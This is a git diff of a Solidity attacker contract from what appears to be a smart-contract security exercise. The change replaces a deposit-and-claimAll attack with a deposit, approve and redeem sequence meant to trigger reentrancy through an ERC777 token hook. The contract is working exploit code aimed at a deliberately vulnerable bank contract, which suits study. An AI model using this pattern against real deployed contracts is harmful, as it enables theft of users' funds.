@@ -38,13 +38,17 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
-		emit Deposit(msg.value); // Using msg.value as the actual deposited amount
+		emit Deposit(msg.value);
 
-        // 1. Deposit ETH into the Bank contract to get a positive balance, {Link: according to QuickNode https://www.quicknode.com/guides/ethereum-development/smart-contracts/a-broad-overview-of-reentrancy-attacks-in-solidity-contracts}
-        bank.deposit{value: msg.value}(); // Send whatever ETH was sent with the transaction
+        bank.deposit{value: amt}();
 
-        // 2. Call the vulnerable claimAll() function on the Bank contract, which is expected to transfer ERC777 tokens
-        bank.claimAll();
+        ERC777 mcitrToken = bank.token();
+        uint256 attackerMCITRBalance = mcitrToken.balanceOf(address(this));
+        require(attackerMCITRBalance >= amt, "Attacker needs sufficient MCITR to redeem");
+
+        mcitrToken.approve(address(bank), amt);
+
+        bank.redeem(amt);
 	}
 
 	/*
@@ -81,8 +85,6 @@ contract Attacker is AccessControl, IERC777Recipient {
             }
             depth--;
         }
-
-
 	}
 
 }
